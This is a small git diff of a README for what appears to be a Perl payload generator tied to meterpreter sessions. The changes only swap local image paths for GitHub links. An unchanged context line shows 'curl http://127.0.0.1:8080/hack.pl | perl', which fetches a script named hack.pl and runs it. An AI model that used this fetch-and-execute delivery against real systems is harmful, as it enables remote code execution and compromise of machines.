@@ -23,11 +23,11 @@ curl http://127.0.0.1:8080/hack.pl | perl
 ```
 
 ### meterpreter
-![](./png/msf.png)
+![meterpreter](https://github.com/purpleroc/gen_perl/raw/master/pic/msf.png)
 
 ### server
 > process info
-![](./png/ps.png)
+![process_info](https://github.com/purpleroc/gen_perl/raw/master/pic/ps.png)
 
 > file info
-![](./png/file.png)
+![file_info](https://github.com/purpleroc/gen_perl/raw/master/pic/file.png)
